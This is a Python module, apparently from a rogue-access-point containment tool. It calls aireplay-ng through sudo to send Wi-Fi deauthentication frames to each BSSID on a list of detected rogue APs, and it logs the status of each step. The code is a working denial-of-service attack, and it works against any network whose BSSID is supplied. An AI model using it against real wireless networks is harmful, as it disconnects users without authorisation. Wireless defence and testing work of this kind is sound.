import subprocess
import time
from utils.status import display_status
from typing import List, Dict


def send_deauth_packets(interface: str, target_bssid: str) -> None:
    """
    Send deauthentication packets to a target BSSID using aireplay-ng.

    Args:
        interface (str): Wireless interface in monitor mode.
        target_bssid (str): Target BSSID to deauthenticate.
    """
    command = [
        'sudo', 'aireplay-ng', '--deauth', '10', '--ignore-negative-one', '-a', target_bssid, interface
    ]

    # Display and log the status
    display_status("Sending deauthentication packet", f"Target: {target_bssid}, Interface: {interface}")

    try:
        # Execute the command. This will block until completion.
        subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        display_status("Deauthentication packet sent", f"Target: {target_bssid}")
    except subprocess.CalledProcessError as e:
        error_message = e.stderr.decode().strip() if e.stderr else str(e)
        display_status("Error sending deauthentication packet", f"Target: {target_bssid}, Error: {error_message}")
    except Exception as e:
        # Catch any other exceptions to prevent crashes
        display_status("Unexpected error during deauth", f"Target: {target_bssid}, Error: {str(e)}")


def perform_deauth_attack(rogue_aps: List[Dict[str, str]], interface: str) -> None:
    """
    Perform a deauthentication attack against all rogue APs.

    Args:
        rogue_aps (List[Dict]): List of rogue AP dictionaries with at least a 'BSSID' key.
        interface (str): Wireless interface in monitor mode.
    """
    if not rogue_aps:
        display_status("No rogue APs detected", "Skipping deauthentication attack.")
        return

    targets = ', '.join([ap.get('BSSID', '<unknown>') for ap in rogue_aps])
    display_status("Deauthentication attack initiated", f"Targets: {targets}")

    for ap in rogue_aps:
        bssid = ap.get('BSSID')
        if bssid:
            send_deauth_packets(interface, bssid)
        else:
            display_status("Invalid AP entry", f"Missing BSSID for AP: {ap}")

    display_status("Deauthentication attack completed", "All rogue APs targeted.")
